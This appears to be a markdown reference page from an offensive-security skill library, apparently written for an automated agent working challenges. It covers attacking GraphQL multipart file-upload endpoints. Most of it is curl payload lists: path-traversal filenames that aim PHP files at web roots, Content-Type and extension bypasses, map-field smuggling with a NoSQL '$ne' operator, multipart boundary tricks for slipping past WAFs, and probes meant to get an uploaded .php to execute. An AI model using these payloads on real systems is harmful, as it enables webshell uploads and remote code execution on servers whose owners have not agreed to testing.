# File upload through GraphQL — the multipart spec

GraphQL's upload spec (graphql-multipart-request-spec) lets mutations take
`Upload` scalars via `multipart/form-data`. The upload path is a
`skills/web-file-upload/` target — this file covers the GraphQL-specific
carrier and its parsing quirks.

---

## 1. The spec

```bash
curl -s "$BASE/graphql" \
  -F 'operations={"query":"mutation($f:Upload!){upload(file:$f){url}}","variables":{"f":null}}' \
  -F 'map={"0":["variables.f"]}' \
  -F '0=@/tmp/x.png;type=image/png'
```

Three form fields:

- `operations` — the GraphQL document JSON; `variables.f` is `null` (the
  file binds separately).
- `map` — JSON object mapping form-file-key → variable-path.
  `{"0":["variables.f"]}` binds form-file `0` to `variables.f`.
- `0`, `1`, `2`... — the actual files.

Multi-file:

```bash
-F 'operations={"query":"mutation($a:Upload!,$b:Upload!){uploadAll(a:$a,b:$b){ok}}","variables":{"a":null,"b":null}}' \
-F 'map={"0":["variables.a"],"1":["variables.b"]}' \
-F '0=@/tmp/a.png' \
-F '1=@/tmp/b.png'
```

## 2. Discovery — finding upload mutations

```bash
# schema scan for Upload scalar
jq -r '.data.__schema.types[] | select(.name=="Mutation").fields[] |
  select(any(.args[]; .type.name=="Upload" or
    (.type.kind=="NON_NULL" and .type.ofType.name=="Upload"))) |
  "\(.name)(\([.args[].name]|join(",")))"' schema.json
```

Mutation names: `upload*`, `import*`, `attach*`, `addFile*`, `addImage*`,
`setAvatar*`, `addPhoto*`, `importData*`, `attachFile*`, `putFile*`,
`storeFile*`, `saveFile*`, `addDocument*`, `addMedia*`, `addAsset*`,
`createFile*`, `newFile*`, `submitFile*`, `pushFile*`, `sendFile*`.

## 3. The upload-path attack surface

Once `upload` resolves, `skills/web-file-upload/` owns the payload side —
this file is the carrier-specific stuff:

### 3.1 Filename traversal

```bash
-F '0=@/tmp/x;filename=../../../tmp/evil.php'
-F '0=@/tmp/x;filename=..\\..\\..\\evil.php'
-F '0=@/tmp/x;filename=/tmp/evil.php'
-F '0=@/tmp/x;filename=../../../var/www/html/x.php'
-F '0=@/tmp/x;filename=....//....//x.php'
-F '0=@/tmp/x;filename=../../../proc/self/cwd/x.php'
-F '0=@/tmp/x;filename=../../../app/static/x.php'
-F '0=@/tmp/x;filename=../../../app/uploads/x.php'
-F '0=@/tmp/x;filename=../../../app/public/x.php'
-F '0=@/tmp/x;filename=../../../app/assets/x.php'
-F '0=@/tmp/x;filename=%2e%2e%2f%2e%2e%2f%2e%2e%2fx.php'
-F '0=@/tmp/x;filename=..%2f..%2f..%2fx.php'
-F '0=@/tmp/x;filename=..%5c..%5c..%5cx.php'
```

### 3.2 Content-Type lies

```bash
-F '0=@/tmp/x.php;type=image/png'          # php file, png CT
-F '0=@/tmp/x.php;type=image/jpeg'
-F '0=@/tmp/x.php;type=image/gif'
-F '0=@/tmp/x.php;type=image/svg+xml'
-F '0=@/tmp/x.php;type=text/plain'
-F '0=@/tmp/x.php;type=application/octet-stream'
-F '0=@/tmp/x.php;type='                    # empty CT
-F '0=@/tmp/x.php'                          # no CT field — server guesses
-F '0=@/tmp/x.png.php;type=image/png'       # dual extension
-F '0=@/tmp/x.php%00.png;type=image/png'    # null-byte suffix
-F '0=@/tmp/x.php5;type=image/png'
-F '0=@/tmp/x.phtml;type=image/png'
-F '0=@/tmp/x.phar;type=image/png'
-F '0=@/tmp/x.php.jpg;type=image/png'
-F '0=@/tmp/x.JPG.php;type=image/png'      # case trick
-F '0=@/tmp/x.php.png;type=image/jpeg'
```

### 3.3 The actual file contents

`skills/web-file-upload/references/` has the full payload corpus — polyglots,
webshells, MIME-bypass tricks, magic-byte stubs, XXE SVGs, HTML-smuggle SVGs.
The GraphQL-specific part is the *carrier*: the file arrives via
`multipart/form-data` fields, so the server's multipart parser decides the
filename/type/size limits — not the GraphQL layer.

### 3.4 Upload-directory probes

```graphql
mutation{upload(file:$f){url}}
mutation{upload(file:$f){path}}
mutation{upload(file:$f){filename}}
mutation{upload(file:$f){file{url}}}
mutation{upload(file:$f){file{path}}}
mutation{upload(file:$f){file{filename}}}
mutation{upload(file:$f){file{id}}}
mutation{upload(file:$f){file{size}}}
mutation{upload(file:$f){file{mimeType}}}
mutation{upload(file:$f){file{contentType}}}
mutation{upload(file:$f){file{originalName}}}
mutation{upload(file:$f){file{storagePath}}}
mutation{upload(file:$f){file{publicUrl}}}
mutation{upload(file:$f){file{downloadUrl}}}
mutation{upload(file:$f){file{cdnUrl}}}
```

The returned `url`/`path`/`storagePath`/`publicUrl`/`cdnUrl`/`downloadUrl`
leaks the storage layout — where it lands decides execution surface.

### 3.5 Resolvers that *process* the file

The mutation may not just store — it may *process*:

```graphql
mutation{uploadAndParse(file:$f){rows}}
mutation{importCsv(file:$f){count}}
mutation{importJson(file:$f){count}}
mutation{importXml(file:$f){count}}
mutation{convertImage(file:$f,format:"png"){url}}
mutation{resizeImage(file:$f,width:100,height:100){url}}
mutation{extractText(file:$f){text}}
mutation{parsePdf(file:$f){pages}}
mutation{processVideo(file:$f){url}}
mutation{scanFile(file:$f){clean}}
mutation{validateFile(file:$f){valid}}
mutation{readFile(file:$f){content}}
mutation{previewFile(file:$f){html}}
```

Each processing step is a different sink — CSV→DB, XML→XXE
(`skills/web-xxe/`), image→ImageMagick-cmdi, PDF→pdftotext-cmdi,
unzip→traversal, av-scan→clamav-injection.

## 4. The `map` field abuse

The `map` binds file keys to variable paths — the *path* is
attacker-controlled:

```bash
# bind a file to a different variable
-F 'map={"0":["variables.other"]}'

# nested path binding
-F 'map={"0":["variables.input.files.0"]}'

# array index binding
-F 'map={"0":["variables.files[0]"],"1":["variables.files[1]"]}'

# deep-path smuggling — where does it land?
-F 'map={"0":["variables.filter.password.$ne"]}'
```

A `map` path pointing somewhere unusual may bind the file content to a
different variable — type-confusion surface (`type-confusion.md`).

## 5. Multipart parser differentials

The GraphQL server and the WAF/proxy may parse the multipart body differently:

```bash
# boundary tricks
--boundary
--boundaryX          # extra char — which parser accepts?
-- boundary
--boundary 
--boundary\x00
boundary=--x
boundary="--x"
boundary=--x;
boundary=--x\x00
boundary=--
boundary=
```

`skills/web-parser-differential/` and `skills/web-request-smuggling/` own
the deep catalog — the GraphQL-specific note is that the multipart parser
is a *third* parser in the chain (WAF → GraphQL → multipart), each with
its own rules.

## 6. Empty/null file handling

```bash
# variables.f null but no file sent — resolver's null path
-F 'operations={"query":"mutation($f:Upload!){upload(file:$f){url}}","variables":{"f":null}}' \
-F 'map={}'

# map references a non-existent file
-F 'operations={...,"variables":{"f":null}}' -F 'map={"0":["variables.f"]}'
# — file 0 never sent — what does the resolver get?

# empty file
-F '0=@/dev/null'

# zero-length but filename present
-F '0=@/tmp/empty;filename=x.php'
```

The null-file path sometimes skips the file-check entirely — `upload` may
create a record pointing at a *default* path or a null-named file — probe
what it returns.

## 7. Storage-path leaks

```graphql
# after upload, the response leaks the path
{"data":{"upload":{"url":"/uploads/a1b2c3.png",
                   "path":"/var/www/uploads/a1b2c3.png",
                   "storagePath":"s3://bucket/a1b2c3.png"}}}
```

The path tells you:

- `/uploads/` — public dir; if it's web-served and `.php` executes → RCE.
- `s3://bucket/` — S3-backed; URL-redirect tricks + signed-url TTL.
- `/var/www/` — filesystem; traversal to web-root target.
- `/tmp/` — temp dir; probably wiped.
- `file:///` — file-URI; check if the read-side accepts `file://` traversal.

## 8. Authz on upload

```graphql
# unauth upload — does it resolve?
mutation{upload(file:$f){url}}
# → if it resolves without a session — unauth upload surface

# the returned url is reachable?
GET /uploads/x.php     → 200 executes?
GET /uploads/x.png.php → 200 as text or executes?
```

The upload `url` reaching a `.php` that executes = RCE — `skills/web-file-upload/`
owns that depth.

## 9. Recording

```bash
python3 tools/state.py $CHAL --hypothesis \
  "upload mutation accepts multipart — filename traversal live"
```

The upload's class is `web-file-upload` for the storage-side bug; GraphQL
is the carrier. Ledger under the owning class.
